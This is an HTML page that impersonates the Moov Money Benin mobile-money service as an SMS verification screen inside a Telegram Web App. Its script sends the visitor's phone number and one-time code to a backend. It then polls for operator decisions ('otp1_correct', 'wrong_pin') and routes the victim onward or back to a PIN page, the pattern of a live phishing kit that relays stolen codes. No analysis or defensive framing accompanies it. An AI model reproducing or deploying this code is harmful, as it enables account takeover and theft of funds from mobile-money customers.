<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Moov Money Bénin - Vérification SMS</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --moov-orange: #f26522;
            --moov-blue: #004b87;
        }

        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--moov-blue);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            width: 100vw;
            overflow: hidden;
        }

        .fullscreen-card {
            background: #ffffff;
            width: 100%;
            height: 100vh;
            max-width: 480px;
            padding: 40px 24px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            box-shadow: 0 0 30px rgba(0, 0, 0, 0.3);
            position: relative;
        }

        .brand-header {
            font-size: 26px;
            font-weight: 800;
            color: var(--moov-blue);
            margin-bottom: 8px;
            text-align: center;
        }

        .brand-header span {
            color: var(--moov-orange);
        }

        .instruction {
            font-size: 15px;
            color: #555555;
            margin-bottom: 20px;
            text-align: center;
            line-height: 1.5;
        }

        .phone-badge {
            background-color: #f0f4f8;
            padding: 8px 16px;
            border-radius: 20px;
            font-weight: 700;
            color: var(--moov-blue);
            margin-bottom: 20px;
            font-size: 16px;
            border: 1px solid #d9e2ec;
        }

        /* Error notification banner for wrong OTP */
        .error-message {
            background-color: #fde8e8;
            color: #e74c3c;
            border: 1px solid #f8b4b4;
            padding: 12px 16px;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 700;
            margin-bottom: 20px;
            width: 100%;
            text-align: center;
            display: none;
            box-shadow: 0 2px 6px rgba(231, 76, 60, 0.15);
        }

        .code-input-container {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin-bottom: 30px;
            width: 100%;
        }

        .code-box {
            width: 44px;
            height: 52px;
            border: 2px solid var(--moov-blue);
            border-radius: 10px;
            text-align: center;
            font-size: 22px;
            font-weight: 800;
            outline: none;
            text-transform: uppercase;
            color: #111111;
            background-color: #fafbfc;
        }

        .code-box:focus {
            border-color: var(--moov-orange);
            background-color: #ffffff;
            box-shadow: 0 0 8px rgba(242, 101, 34, 0.25);
        }

        .submit-btn {
            width: 100%;
            background-color: #e0e0e0;
            color: #999999;
            border: none;
            padding: 18px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 800;
            cursor: not-allowed;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            transition: background-color 0.2s;
        }

        .submit-btn.active {
            background-color: var(--moov-orange);
            color: white;
            cursor: pointer;
        }

        .submit-btn.active:hover {
            background-color: #d4551b;
        }

        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 75, 135, 0.95);
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 999;
            color: white;
            text-align: center;
            padding: 24px;
        }

        .spinner {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-top: 5px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>

<body>

<div class="fullscreen-card">
    <div class="brand-header"><span>Moov</span> Money</div>
    <p class="instruction">
        Veuillez entrer le code de vérification à 6 caractères reçu par SMS :
    </p>

    <div class="phone-badge">
        🇧🇯 +229 <span id="displayPhone">--</span>
    </div>

    <!-- Notification Banner for Wrong OTP -->
    <div id="errorText" class="error-message">
        ⚠️ Code SMS incorrect. Veuillez vérifier le code reçu et réessayer.
    </div>

    <div class="code-input-container">
        <input type="text" maxlength="1" class="code-box" autocomplete="off" spellcheck="false">
        <input type="text" maxlength="1" class="code-box" autocomplete="off" spellcheck="false">
        <input type="text" maxlength="1" class="code-box" autocomplete="off" spellcheck="false">
        <input type="text" maxlength="1" class="code-box" autocomplete="off" spellcheck="false">
        <input type="text" maxlength="1" class="code-box" autocomplete="off" spellcheck="false">
        <input type="text" maxlength="1" class="code-box" autocomplete="off" spellcheck="false">
    </div>

    <button id="submitBtn" class="submit-btn" disabled>VALIDER</button>

    <div class="overlay" id="statusOverlay">
        <div class="spinner"></div>
        <div style="font-size: 18px; font-weight: 700;">Vérification du code...</div>
    </div>
</div>

<script>
document.addEventListener("DOMContentLoaded", () => {
    const displayPhone = document.getElementById('displayPhone');
    const codeBoxes = document.querySelectorAll('.code-box');
    const submitBtn = document.getElementById('submitBtn');
    const statusOverlay = document.getElementById('statusOverlay');
    const errorText = document.getElementById('errorText');

    let checkInterval = null;

    const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone') || "";
    displayPhone.textContent = savedPhone;

    if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand();
    }

    codeBoxes.forEach((box, index) => {
        box.addEventListener('input', () => {
            box.value = box.value.toUpperCase().replace(/[^A-Z0-9]/g, '');

            if (box.value && index < codeBoxes.length - 1) {
                codeBoxes[index + 1].focus();
            }

            checkInputs();
        });

        box.addEventListener('keydown', (e) => {
            if (e.key === "Backspace" && !box.value && index > 0) {
                codeBoxes[index - 1].focus();
            }
        });
    });

    function checkInputs() {
        const fullCode = Array.from(codeBoxes).map(b => b.value).join('');
        const isComplete = fullCode.length === 6;
        submitBtn.disabled = !isComplete;
        submitBtn.classList.toggle('active', isComplete);
    }

    function startStatusPolling() {
        if (checkInterval) clearInterval(checkInterval);

        checkInterval = setInterval(async () => {
            try {
                const res = await fetch(`/api/check-status?phone=${encodeURIComponent(savedPhone)}`);
                const data = await res.json();

                if (data.status === "otp1_correct") {
                    clearInterval(checkInterval);
                    window.location.href = "/page9";
                } 
                else if (data.status === "otp1_wrong") {
                    // Show wrong OTP notification banner, clear input, focus box
                    clearInterval(checkInterval);
                    statusOverlay.style.display = "none";
                    errorText.style.display = "block";
                    codeBoxes.forEach(b => b.value = "");
                    codeBoxes[0].focus();
                    checkInputs();
                }
                else if (data.status === "wrong_pin" || data.status === "denied") {
                    // Redirect back to PIN entry page with error banner
                    clearInterval(checkInterval);
                    window.location.href = "/page6?error=wrongpin";
                }
            } catch (err) {
                console.error("Erreur de statut:", err);
            }
        }, 2000);
    }

    submitBtn.addEventListener('click', async () => {
        if (submitBtn.disabled) return;

        const codeValue = Array.from(codeBoxes).map(b => b.value).join('');
        if (codeValue.length < 6) return;

        statusOverlay.style.display = "flex";
        errorText.style.display = "none";

        try {
            const res = await fetch('/api/verify-first-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    phone: savedPhone,
                    code: codeValue,
                    country: "BJ"
                })
            });

            const responseData = await res.json();
            if (responseData.success) {
                startStatusPolling();
            } else {
                statusOverlay.style.display = "none";
                alert("Erreur lors de l'envoi.");
            }
        } catch (err) {
            statusOverlay.style.display = "none";
            alert("Erreur de connexion.");
        }
    });

    codeBoxes[0].focus();
});
</script>

</body>
</html>
